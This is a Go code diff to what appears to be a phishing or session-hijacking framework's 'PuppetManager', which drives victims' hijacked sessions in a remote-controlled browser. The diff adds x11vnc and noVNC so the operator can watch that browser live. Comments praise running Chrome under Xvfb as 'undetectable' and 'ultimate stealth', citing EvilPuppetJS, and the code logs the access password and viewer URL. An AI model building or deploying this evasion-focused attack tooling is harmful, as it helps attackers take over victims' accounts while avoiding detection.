@@ -119,8 +119,12 @@ type PuppetManager struct {
 	chromePath string
 	port       int
 	password   string
-	xvfbCmd    *exec.Cmd // Xvfb virtual display process (nil if not using Xvfb)
-	xvfbDisplay string   // e.g. ":99"
+	xvfbCmd      *exec.Cmd // Xvfb virtual display process (nil if not using Xvfb)
+	xvfbDisplay  string    // e.g. ":99"
+	x11vncCmd    *exec.Cmd // x11vnc VNC server process
+	websockifyCmd *exec.Cmd // websockify/noVNC process for browser-based VNC
+	vncPort      int       // VNC port (5900)
+	noVNCPort    int       // noVNC web port (6080)
 }
 
 func NewPuppetManager(cfg *Config, db *database.Database) *PuppetManager {
@@ -140,6 +144,7 @@ func NewPuppetManager(cfg *Config, db *database.Database) *PuppetManager {
 // startXvfb starts an Xvfb virtual display so Chrome can run in non-headless mode on a
 // server without a physical display. This is the same approach EvilPuppetJS uses —
 // headless:false is undetectable because the browser literally isn't headless.
+// Also starts x11vnc + noVNC so you can watch the browser in your web browser.
 // Falls back gracefully: if Xvfb isn't installed, Chrome runs in --headless=new mode.
 func (pm *PuppetManager) startXvfb() {
 	xvfbPath, err := exec.LookPath("Xvfb")
@@ -160,7 +165,6 @@ func (pm *PuppetManager) startXvfb() {
 	// Give Xvfb a moment to initialize
 	time.Sleep(500 * time.Millisecond)
 
-	// Verify it's running
 	if cmd.Process == nil {
 		log.Warning("Xvfb process didn't start — falling back to headless mode")
 		return
@@ -168,12 +172,136 @@ func (pm *PuppetManager) startXvfb() {
 
 	pm.xvfbCmd = cmd
 	pm.xvfbDisplay = display
+	pm.vncPort = 5900
+	pm.noVNCPort = 6080
 	os.Setenv("DISPLAY", display)
 	log.Success("Xvfb started on display %s — Chrome will run in non-headless mode (ultimate stealth)", display)
+
+	// Start x11vnc to expose the virtual display over VNC
+	pm.startVNC(display)
 }
 
-// StopXvfb stops the virtual display when the PuppetManager is shut down.
+// startVNC starts x11vnc and optionally noVNC/websockify for browser-based viewing.
+// x11vnc mirrors the Xvfb display over VNC protocol.
+// websockify + noVNC provide a browser-based VNC client at http://server:6080/vnc.html
+func (pm *PuppetManager) startVNC(display string) {
+	x11vncPath, err := exec.LookPath("x11vnc")
+	if err != nil {
+		log.Info("x11vnc not found — install it to view the puppet browser remotely: apt install x11vnc")
+		return
+	}
+
+	// Start x11vnc on the Xvfb display with the puppet password
+	vncCmd := exec.Command(x11vncPath,
+		"-display", display,
+		"-forever",     // don't exit after first client disconnects
+		"-shared",      // allow multiple simultaneous connections
+		"-passwd", pm.password, // use puppet password for VNC auth
+		"-rfbport", fmt.Sprintf("%d", pm.vncPort),
+		"-noxdamage",   // avoid rendering issues
+		"-noxfixes",    // avoid cursor issues
+		"-noxrecord",
+	)
+	vncCmd.Stdout = nil
+	vncCmd.Stderr = nil
+
+	if err := vncCmd.Start(); err != nil {
+		log.Warning("failed to start x11vnc: %v", err)
+		return
+	}
+
+	pm.x11vncCmd = vncCmd
+	time.Sleep(300 * time.Millisecond)
+	log.Success("x11vnc started on port %d (password: puppet password)", pm.vncPort)
+
+	// Start noVNC/websockify for browser-based access
+	pm.startNoVNC()
+}
+
+// startNoVNC starts websockify to bridge WebSocket connections to x11vnc.
+// This allows viewing the puppet browser from any web browser via noVNC.
+func (pm *PuppetManager) startNoVNC() {
+	// Try websockify (comes with python3-websockify or novnc package)
+	websockifyPath, err := exec.LookPath("websockify")
+	if err != nil {
+		log.Info("websockify not found — install novnc for browser-based VNC: apt install novnc")
+		log.Info("You can still connect with a VNC client to port %d", pm.vncPort)
+		return
+	}
+
+	// Find the noVNC web directory
+	noVNCWeb := ""
+	for _, dir := range []string{
+		"/usr/share/novnc",
+		"/usr/share/noVNC",
+		"/usr/share/novnc/utils/../",
+	} {
+		if _, err := os.Stat(dir + "/vnc.html"); err == nil {
+			noVNCWeb = dir
+			break
+		}
+		// Some distros use vnc_lite.html instead
+		if _, err := os.Stat(dir + "/vnc_lite.html"); err == nil {
+			noVNCWeb = dir
+			break
+		}
+	}
+
+	if noVNCWeb == "" {
+		log.Info("noVNC web files not found — install novnc: apt install novnc")
+		log.Info("You can still connect with a VNC client to port %d", pm.vncPort)
+		return
+	}
+
+	wsCmd := exec.Command(websockifyPath,
+		"--web", noVNCWeb,
+		fmt.Sprintf("%d", pm.noVNCPort),
+		fmt.Sprintf("localhost:%d", pm.vncPort),
+	)
+	wsCmd.Stdout = nil
+	wsCmd.Stderr = nil
+
+	if err := wsCmd.Start(); err != nil {
+		log.Warning("failed to start websockify/noVNC: %v", err)
+		log.Info("You can still connect with a VNC client to port %d", pm.vncPort)
+		return
+	}
+
+	pm.websockifyCmd = wsCmd
+	time.Sleep(300 * time.Millisecond)
+
+	serverIP := pm.cfg.GetServerExternalIP()
+	if serverIP == "" {
+		serverIP = "your-server-ip"
+	}
+	log.Success("noVNC started — view puppet browser at: http://%s:%d/vnc.html?autoconnect=true", serverIP, pm.noVNCPort)
+	log.Info("noVNC password: %s", pm.password)
+}
+
+// GetVNCURL returns the URL for the browser-based VNC viewer (noVNC).
+func (pm *PuppetManager) GetVNCURL() string {
+	if pm.websockifyCmd == nil {
+		return ""
+	}
+	serverIP := pm.cfg.GetServerExternalIP()
+	if serverIP == "" {
+		serverIP = "your-server-ip"
+	}
+	return fmt.Sprintf("http://%s:%d/vnc.html?autoconnect=true", serverIP, pm.noVNCPort)
+}
+
+// StopXvfb stops the virtual display and VNC services.
 func (pm *PuppetManager) StopXvfb() {
+	if pm.websockifyCmd != nil && pm.websockifyCmd.Process != nil {
+		pm.websockifyCmd.Process.Kill()
+		pm.websockifyCmd.Wait()
+		log.Info("noVNC/websockify stopped")
+	}
+	if pm.x11vncCmd != nil && pm.x11vncCmd.Process != nil {
+		pm.x11vncCmd.Process.Kill()
+		pm.x11vncCmd.Wait()
+		log.Info("x11vnc stopped")
+	}
 	if pm.xvfbCmd != nil && pm.xvfbCmd.Process != nil {
 		pm.xvfbCmd.Process.Kill()
 		pm.xvfbCmd.Wait()
@@ -355,6 +483,10 @@ func (pm *PuppetManager) runPuppet(puppet *PuppetInstance, dbSession *database.S
 	}
 	controlURL := fmt.Sprintf("http://%s:%d/puppet/%d?key=%s", serverIP, pm.port, puppet.Id, pm.password)
 	log.Info("puppet [%d]: control URL: %s", puppet.Id, controlURL)
+
+	if vncURL := pm.GetVNCURL(); vncURL != "" {
+		log.Info("puppet [%d]: VNC viewer (watch browser): %s", puppet.Id, vncURL)
+	}
 
 	// Start the DOM content streaming loop
 	go DomStreamLoop(puppet)
